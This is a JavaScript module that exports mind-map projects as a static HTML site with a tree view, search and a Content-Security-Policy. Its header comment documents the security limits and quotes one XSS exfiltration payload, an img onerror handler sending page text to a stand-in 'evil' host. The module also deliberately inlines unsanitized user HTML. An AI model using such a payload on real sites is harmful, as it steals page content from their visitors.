/* ============================================================
 * src/export-html.js — 静态站点导出（UMD 纯逻辑，无 IO）
 * ------------------------------------------------------------
 * 把项目导出为**可分享/可部署的静态站点**：一个 index.html + 复制的 assets/、attachments/。
 * 纯函数只负责生成 HTML 字符串；读盘/复制文件由 cli/commands/project.js 做，
 * 这样 HTML 生成规则能被单测直接锁住（见 tests/export-html.test.js）。
 *
 * 与 Obsidian Publish / Quartz 的差异（本工程的多出来的东西）：
 *   1) **「相关知识点」内联成可点超链接** —— 静态页里就能沿关系链跳转，
 *      而 Obsidian 的静态发布通常只保留反链列表，需要插件才能内联。
 *   2) 每个节点带稳定锚点 `#<id>`，便于外部深链。
 *
 * 安全（必须知道）：detail 是用户自己写的 HTML，本导出**原样内联**（不做消毒），
 * 这与应用内渲染（innerHTML）行为一致 —— 分享给他人时，等于把作者的 HTML 一并给出。
 * 因此：**只导出你自己写的项目**。此处不引入消毒器：零依赖是工程硬约束，
 * 而一个不完整的消毒器比诚实标注边界更危险。
 *
 * 已加的一道防线与它的边界（不要过度声称）：
 *   - 加了 CSP：`default-src 'none'`、`img-src 'self' data:`、`connect-src 'none'`、
 *     `form-action 'none'`、`base-uri 'none'` —— 能**阻断 XHR/fetch 回传、表单提交、
 *     以及远程图片/字体等子资源加载**。
 *   - **但它并不等于"数据发不出去"**（此处曾写得过头，现更正）：页面必须内联脚本与样式
 *     （零依赖、单文件），故 `script-src` 仍是 `'unsafe-inline'`，**内联事件处理器会执行**；
 *     而 CSP **没有 `navigate-to` 指令**（该指令已从规范移除），`default-src`/`connect-src`
 *     都**不约束顶层导航**。因此这类路径仍然成立：
 *       `<img src=x onerror="location='https://evil/?'+document.body.innerText">`
 *     即"内联处理器 + 顶层跳转"可以绕过 CSP 把内容带出去。
 *   - 另：detail 经 innerHTML 插入，**插入的 `<script>` 不会执行**（HTML 规范如此），
 *     这是一层实际保护，但不足以抵消上面那条。
 * 结论：CSP 是**降低影响面**，不是隔离。**只导出你自己的项目。**
 *
 * 注入防护：嵌进 <script> 的 JSON 必须把 `<`、`>`、`&`、U+2028/2029 转义，
 * 否则正文里出现 `</script>` 会提前闭合脚本标签、破坏页面（这是真实的破坏路径）。
 * ============================================================ */
(function (root, factory) {
  if (typeof module === 'object' && module.exports) {
    module.exports = factory(require('./tree-utils.js'), require('./convert.js'), require('./relations.js'));
  } else {
    root.MMExportHtml = factory(root.MMTree, root.MMConvert, root.MMRelations);
  }
})(typeof self !== 'undefined' ? self : this, function (tree, convert, relations) {
  'use strict';

  const ESC = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
  function esc(s) {
    return String(s === undefined || s === null ? '' : s).replace(/[&<>"']/g, (c) => ESC[c]);
  }

  /** 安全地把对象嵌进 <script> 标签的内联 JSON */
  function safeJson(obj) {
    // JSON.stringify(undefined) 返回 undefined（不是字符串），后续 .replace 会抛 TypeError。
    // 这是公开 API，按"永不抛"处理更稳：无法序列化时给一个空对象字面量。
    const s = JSON.stringify(obj);
    if (typeof s !== 'string') return 'null';
    return s
      .replace(/</g, '\\u003c')
      .replace(/>/g, '\\u003e')
      .replace(/&/g, '\\u0026')
      .replace(/\u2028/g, '\\u2028')
      .replace(/\u2029/g, '\\u2029');
  }

  /** 项目数据 → 静态页需要的扁平模型（节点 + 关系 + 标签） */
  function buildModel(data, opts) {
    const o = opts || {};
    const selfName = o.projectName || (data.meta && data.meta.name) || 'project';
    const nodes = [];
    tree.walk(data.data, (n, depth) => {
      nodes.push({
        id: n.id,
        topic: n.topic,
        depth: depth - 1,
        parent: null,
        detail: n.detail || '',
        tags: Array.isArray(n.tags) ? n.tags : [],
        images: (n.images || []).map((i) => ({ file: i.file, caption: i.caption || '', source: i.source || '' })),
        files: (n.files || []).map((f) => ({ file: f.file, caption: f.caption || '', source: f.source || '' })),
        links: (n.links || []).map((l) => ({ project: l.project, id: l.id, caption: l.caption || '' })),
        children: (n.children || []).map((c) => c.id)
      });
    });
    // 补 parent（供面包屑/树形渲染）
    const byId = {};
    nodes.forEach((n) => { byId[n.id] = n; });
    nodes.forEach((n) => {
      n.children.forEach((cid) => { if (byId[cid]) byId[cid].parent = n.id; });
    });
    // 相关知识点（出边 + 入边），只在本项目内解析标题；跨项目链接仅保留提示
    //
    // **索引只建一次**：relatedAll 每次调用都会重建 topicIndex/backlinkIndex，
    // 而这里要对每个节点调一次 —— 不传索引就是 O(N²)（实测 1200 节点 729ms）。
    // 传 indexes 后索引只建一次，单节点开销降到 O(度)。
    const projects = [{ name: selfName, data }];
    const indexes = relations.buildIndexes ? relations.buildIndexes(projects) : null;
    nodes.forEach((n) => {
      const r = relations.relatedAll(selfName, byId[n.id], projects,
        indexes ? { indexes: indexes } : {});
      n.related = r.items.map((x) => ({
        id: x.node, topic: x.topic, dir: x.dir, caption: x.caption, project: x.project
      }));
    });
    return {
      project: selfName,
      title: (data.meta && data.meta.name) || selfName,
      author: (data.meta && data.meta.author) || '',
      version: (data.meta && data.meta.version) || '',
      nodes
    };
  }

  const CSS = [    ':root{--fg:#1f2328;--muted:#656d76;--bd:#d0d7de;--bg:#fff;--accent:#0969da;--chip:#eff2f5}',
    '*{box-sizing:border-box}',
    'body{margin:0;font:15px/1.65 -apple-system,BlinkMacSystemFont,"Segoe UI","Microsoft YaHei",sans-serif;color:var(--fg);background:var(--bg)}',
    'header{position:sticky;top:0;background:var(--bg);border-bottom:1px solid var(--bd);padding:12px 20px;display:flex;gap:14px;align-items:center;flex-wrap:wrap;z-index:5}',
    'header h1{font-size:16px;margin:0;flex:0 0 auto}',
    'header .meta{color:var(--muted);font-size:12px}',
    '#q{flex:1 1 240px;min-width:180px;padding:6px 10px;border:1px solid var(--bd);border-radius:6px;font-size:14px}',
    'main{display:flex;align-items:flex-start;gap:0}',
    '#tree{flex:0 0 320px;max-height:calc(100vh - 58px);overflow:auto;border-right:1px solid var(--bd);padding:10px 8px 40px}',
    '#content{flex:1 1 auto;max-height:calc(100vh - 58px);overflow:auto;padding:18px 26px 60px;min-width:0}',
    '#tree ul{list-style:none;margin:0;padding-left:14px}',
    '#tree>ul{padding-left:0}',
    '#tree li{margin:1px 0}',
    '#tree a{display:block;padding:3px 6px;border-radius:5px;color:var(--fg);text-decoration:none;font-size:13.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}',
    '#tree a:hover{background:var(--chip)}',
    '#tree a.active{background:var(--accent);color:#fff}',
    '#tree .tw{cursor:pointer;user-select:none;color:var(--muted);display:inline-block;width:13px;font-size:11px}',
    '#tree li.collapsed>ul{display:none}',
    'article h2{margin:0 0 4px;font-size:21px;line-height:1.3}',
    '.crumb{color:var(--muted);font-size:12px;margin-bottom:12px}',
    '.crumb a{color:var(--muted)}',
    '.chips{margin:10px 0}',
    '.chip{display:inline-block;background:var(--chip);border-radius:11px;padding:1px 9px;font-size:12px;margin:0 5px 5px 0;color:var(--muted)}',
    '.sec{margin:18px 0 0;border-top:1px solid var(--bd);padding-top:12px}',
    '.sec h3{font-size:13px;color:var(--muted);margin:0 0 8px;font-weight:600}',
    '.detail img{max-width:100%;border-radius:6px}',
    '.detail pre{background:var(--chip);padding:10px;border-radius:6px;overflow:auto}',
    '.detail table{border-collapse:collapse;margin:8px 0}',
    '.detail th,.detail td{border:1px solid var(--bd);padding:4px 9px}',
    '.rel{list-style:none;margin:0;padding:0}',
    '.rel li{padding:3px 0}',
    '.rel .dir{color:var(--muted);font-weight:600;margin-right:6px}',
    '.rel a{color:var(--accent);text-decoration:none}',
    '.rel a:hover{text-decoration:underline}',
    '.rel .cap{color:var(--muted);font-size:12px;margin-left:8px}',
    '.res{list-style:none;margin:0;padding:0;font-size:13px}',
    '.res li{padding:3px 0}',
    '.res a{color:var(--accent)}',
    '.res .cap,.figcaption .cap{color:var(--muted);margin-left:6px}',
    '.fig{margin:0 0 14px}',
    '.fig img{max-width:100%;border:1px solid var(--bd);border-radius:6px;display:block}',
    '.fig figcaption{color:var(--muted);font-size:12px;margin-top:4px}',
    '.hidden{display:none!important}',
    'footer{color:var(--muted);font-size:12px;padding:14px 26px;border-top:1px solid var(--bd)}',
    '@media(max-width:820px){main{display:block}#tree{flex:none;max-height:40vh;border-right:0;border-bottom:1px solid var(--bd)}#content{max-height:none}}'
  ].join('\n');

  /**
   * 计算搜索的「保留集」：节点**自身或任一后代**命中关键词时保留。
   *
   * 为什么不能只按"自身是否命中"：页面用 CSS `.hidden{display:none}` 隐藏不匹配的
   * 条目，而条目是**嵌套的 `<li>`** —— 祖先一旦被隐藏，整棵子树（含其中真正命中的
   * 深层节点）会一起消失，搜索看起来"什么都搜不到"。（这是实际发生过的缺陷：
   * 最初只 toggle 命中项自身的 li，comnet 上搜"交换机"6 个命中项全在非顶层，
   * 全部被各自的祖先藏掉了。）
   *
   * 保持祖先可见 = 保留集必须**自底向上传播**，这就是本函数的核心。
   * 本函数是**唯一实现**：页面侧通过 `searchKeep.toString()` 注入，
   * 因此单测覆盖到的就是页面上跑的那份代码。
   *
   * @returns { [id]: boolean } 每个 id 是否应保留显示
   */
  function searchKeep(model, q) {
    const query = String(q === undefined || q === null ? '' : q).trim().toLowerCase();
    const kids = {};
    (model.nodes || []).forEach((n) => {
      const k = n.parent || '';
      (kids[k] = kids[k] || []).push(n);
    });
    const own = (n) => !query
      || String(n.topic || '').toLowerCase().indexOf(query) >= 0
      || String(n.detail || '').toLowerCase().indexOf(query) >= 0
      || (n.tags || []).join(',').toLowerCase().indexOf(query) >= 0;
    const keep = {};
    const mark = (n) => {
      let k = own(n);
      (kids[n.id] || []).forEach((c) => { if (mark(c)) k = true; });
      keep[n.id] = k;
      return k;
    };
    (model.nodes || []).forEach((n) => { if (!n.parent) mark(n); });
    // 兜底：parent 指向缺失节点的"孤儿"（数据异常时）也要被标记，否则会凭空消失
    (model.nodes || []).forEach((n) => { if (keep[n.id] === undefined) mark(n); });
    return keep;
  }

  /** 站点 CSP：阻断远程加载与网络回传（边界见文件头注释，别过度声称） */
  const CSP = "default-src 'none'; img-src 'self' data:; media-src 'self' data:; "
    + "style-src 'unsafe-inline'; script-src 'unsafe-inline'; font-src 'self'; "
    + "connect-src 'none'; form-action 'none'; base-uri 'none'";

  // 页面脚本：树渲染 + 搜索 + 节点切换。刻意不依赖任何框架（零依赖硬约束）。
  const APP_JS = [
    '(function(){',
    '  var M=window.__MM__; var byId={}; M.nodes.forEach(function(n){byId[n.id]=n;});',
    '  var treeEl=document.getElementById("tree"), host=document.getElementById("content");',
    '  function esc(s){return String(s==null?"":s).replace(/[&<>"]/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;","\\"":"&quot;"}[c];});}',
    '  function renderTree(){',
    '    var kids={}; M.nodes.forEach(function(n){(kids[n.parent||""]=kids[n.parent||""]||[]).push(n);});',
    // id 一律经 esc()：节点 id 虽受 schema 约束（小写字母/数字/连字符），
    // 但手工编辑过的项目 JSON 可以带任意字符，裸拼会破坏属性甚至注入标签。
    '    function ul(pid){var arr=kids[pid]||[];if(!arr.length)return "";var h="<ul>";',
    '      arr.forEach(function(n){var has=(kids[n.id]||[]).length>0;',
    '        h+="<li data-id=\\""+esc(n.id)+"\\">"+(has?"<span class=\\"tw\\">▾</span>":"<span class=\\"tw\\"></span>")',
    '          +"<a href=\\"#"+esc(n.id)+"\\" data-id=\\""+esc(n.id)+"\\">"+esc(n.topic)+"</a>"+ul(n.id)+"</li>";});',
    '      return h+"</ul>";}',
    '    treeEl.innerHTML=ul("");',
    '    treeEl.addEventListener("click",function(e){',
    '      var t=e.target;',
    '      if(t.className==="tw"){var li=t.parentNode;li.className=li.className==="collapsed"?"":"collapsed";t.textContent=li.className==="collapsed"?"▸":"▾";e.preventDefault();return;}',
    '      var a=t.closest?t.closest("a"):null; if(a){e.preventDefault();show(a.getAttribute("data-id"));}',
    '    });',
    '  }',
    '  function crumb(n){var p=[],x=n;while(x){p.unshift(x);x=byId[x.parent];}',
    '    if(p.length<2)return "";',
    '    return "<div class=\\"crumb\\">"+p.slice(0,-1).map(function(y){return "<a href=\\"#"+esc(y.id)+"\\">"+esc(y.topic)+"</a>";}).join(" / ")+"</div>";}',
    '  function resList(n){var h="";',
    '    if(n.images&&n.images.length){h+="<div class=\\"sec\\"><h3>图片（"+n.images.length+"）</h3>";',
    '      n.images.forEach(function(i){',
    '        h+="<figure class=\\"fig\\"><a href=\\""+esc(i.file)+"\\" target=\\"_blank\\"><img src=\\""+esc(i.file)+"\\" alt=\\""+esc(i.caption||i.file)+"\\" loading=\\"lazy\\"></a>"',
    '          +"<figcaption>"+esc(i.caption||i.file)+(i.source?" <span class=\\"cap\\">出处："+esc(i.source)+"</span>":"")+"</figcaption></figure>";});',
    '      h+="</div>";}',
    '    if(n.files&&n.files.length){h+="<div class=\\"sec\\"><h3>附件（"+n.files.length+"）</h3><ul class=\\"res\\">";',
    '      n.files.forEach(function(f){h+="<li><a href=\\""+esc(f.file)+"\\" target=\\"_blank\\">"+esc(f.caption||f.file)+"</a>"+(f.source?"<span class=\\"cap\\">出处："+esc(f.source)+"</span>":"")+"</li>";});',
    '      h+="</ul></div>";}',
    '    return h;}',
    '  function show(id){var n=byId[id];if(!n)return;',
    '    var h="<article id=\\""+esc(n.id)+"\\">";',
    '    h+="<h2>"+esc(n.topic)+"</h2>"+crumb(n);',
    '    if(n.tags&&n.tags.length){h+="<div class=\\"chips\\">"+n.tags.map(function(t){return "<span class=\\"chip\\">#"+esc(t)+"</span>";}).join("")+"</div>";}',
    '    h+=n.detail?"<div class=\\"detail\\">"+n.detail+"</div>":"";',
    '    if(n.related&&n.related.length){h+="<div class=\\"sec\\"><h3>相关知识点（"+n.related.length+"）</h3><ul class=\\"rel\\">";',
    '      n.related.forEach(function(r){var arrow=r.dir==="out"?"→":(r.dir==="in"?"←":"↔");',
    // 判据必须**同时**看 id 与 project：只判 byId[r.id] 会把"别的项目里的同名节点"
    // 误当成本站点内的节点，渲染成指向本地节点的链接并丢掉 [project] 标注
    // （曾实测：外链 other/overview 被渲染成 <a href="#overview">本项目总览</a>）。
    '        var local=(r.project===M.project)&&byId[r.id];',
    '        var inner=local?"<a href=\\"#"+esc(r.id)+"\\" data-id=\\""+esc(r.id)+"\\">"+esc(r.topic)+"</a>":esc(r.topic)+" <span class=\\"cap\\">["+esc(r.project)+"]</span>";',
    '        h+="<li><span class=\\"dir\\">"+arrow+"</span>"+inner+(r.caption?"<span class=\\"cap\\">— "+esc(r.caption)+"</span>":"")+"</li>";});',
    '      h+="</ul></div>";}',
    '    h+=resList(n);',
    '    h+="</article>";host.innerHTML=h;',
    '    host.querySelectorAll("a[data-id]").forEach(function(a){a.addEventListener("click",function(e){e.preventDefault();show(a.getAttribute("data-id"));});});',
    '    var cur=treeEl.querySelector("a.active");if(cur)cur.className="";',
    // 不用 `querySelector('a[data-id="'+id+'"]')` —— id 里若有引号/方括号会
    // 构造出非法选择器抛 DOMException（且它是注入面）。改为扫描比较属性值。
    '    var na=null;treeEl.querySelectorAll("a[data-id]").forEach(function(a){if(a.getAttribute("data-id")===n.id)na=a;});',
    '    if(na)na.className="active";',
    // 用 try 包住：某些浏览器在 file:// 文档上对 replaceState 抛 SecurityError，
    // 一旦抛出会中断本函数尾部（滚动复位等）。hash 只是便利功能，不该让页面崩在这。
    '    try{if(location.hash!=="#"+n.id)history.replaceState(null,"","#"+n.id);}catch(e){}',
    '    host.scrollTop=0;window.scrollTo(0,0);}',
    '  function search(q){',
    // 搜索时展开折叠分支，否则命中的深层节点仍被 li.collapsed>ul{display:none} 挡住
    '    if(String(q||"").trim()){treeEl.querySelectorAll("li.collapsed").forEach(function(li){',
    '      li.className=li.className.replace(/\\bcollapsed\\b/,"").replace(/\\s+/g," ").trim();',
    '      var tw=li.querySelector(".tw");if(tw)tw.textContent="▾";});}',
    // searchKeep 由 Node 侧同一实现的源码注入（唯一逻辑源，单测覆盖的就是这份）
    '    var keep=searchKeep(M,q);',
    '    treeEl.querySelectorAll("li[data-id]").forEach(function(li){',
    '      li.classList.toggle("hidden",!keep[li.getAttribute("data-id")]);});}',
    '  function boot(){renderTree();',
    '    var q=document.getElementById("q");q.addEventListener("input",function(){search(q.value);});',
    '    window.addEventListener("hashchange",function(){show(location.hash.slice(1));});',
    '    var first=location.hash?location.hash.slice(1):(M.nodes[0]&&M.nodes[0].id);',
    '    if(first)show(first);}',
    '  boot();',
    '})();'
  ].join('\n');

  /**
   * 生成 index.html。
   * @param data 项目数据（{meta, format, data}）
   * @param opts { projectName }
   * @returns 完整 HTML 字符串
   */
  function buildIndexHtml(data, opts) {
    // 公开 API 的空值防御：缺 data/data.data 时给一个仅含根的占位，而不是抛 TypeError。
    const safe = (data && typeof data === 'object') ? data : {};
    const normalized = {
      meta: safe.meta || {},
      format: safe.format || 'node_tree',
      data: (safe.data && typeof safe.data === 'object')
        ? safe.data
        : { id: 'root', topic: (safe.meta && safe.meta.name) || '（空项目）', children: [] }
    };
    const model = buildModel(normalized, opts);
    const title = model.title || model.project;
    const metaBits = [];
    if (model.author) metaBits.push('作者 ' + esc(model.author));
    metaBits.push(model.nodes.length + ' 个节点');
    if (model.version) metaBits.push('版本 ' + esc(model.version));
    return [
      '<!doctype html>',
      '<html lang="zh-CN">',
      '<head>',
      '<meta charset="utf-8">',
      '<meta name="viewport" content="width=device-width,initial-scale=1">',
      '<meta http-equiv="Content-Security-Policy" content="' + CSP + '">',
      '<title>' + esc(title) + '</title>',
      '<style>',
      CSS,
      '</style>',
      '</head>',
      '<body>',
      '<header>',
      '<h1>' + esc(title) + '</h1>',
      '<input id="q" type="search" placeholder="搜索标题 / 正文 / 标签…">',
      '<span class="meta">' + metaBits.join(' · ') + '</span>',
      '</header>',
      '<main>',
      '<nav id="tree"></nav>',
      '<div id="content"></div>',
      '</main>',
      '<footer>由 AI MindMap 静态导出 · 共 ' + model.nodes.length + ' 个节点 · 相关知识点已内联为可跳转链接</footer>',
      '<script id="mm-data" type="application/json">' + safeJson(model) + '</script>',
      '<script>',
      'window.__MM__=JSON.parse(document.getElementById("mm-data").textContent);',
      // searchKeep 的源码在此注入：实现只写一份（Node 侧同一函数），
      // 因此单测覆盖的就是页面实际执行的那段代码，不存在两份实现漂移。
      'var searchKeep=' + searchKeep.toString() + ';',
      '</script>',
      '<script>',
      APP_JS,
      '</script>',
      '</body>',
      '</html>',
      ''
    ].join('\n');
  }
  /** 站点里需要一起复制的资源相对路径（去重） */
  function collectAssets(data) {
    const seen = new Set();
    const out = [];
    tree.walk(data.data, (n) => {
      (n.images || []).forEach((i) => { if (i.file && !seen.has(i.file)) { seen.add(i.file); out.push(i.file); } });
      (n.files || []).forEach((f) => { if (f.file && !seen.has(f.file)) { seen.add(f.file); out.push(f.file); } });
    });
    return out;
  }

  return { buildIndexHtml, buildModel, collectAssets, safeJson, esc, CSP, searchKeep };
});
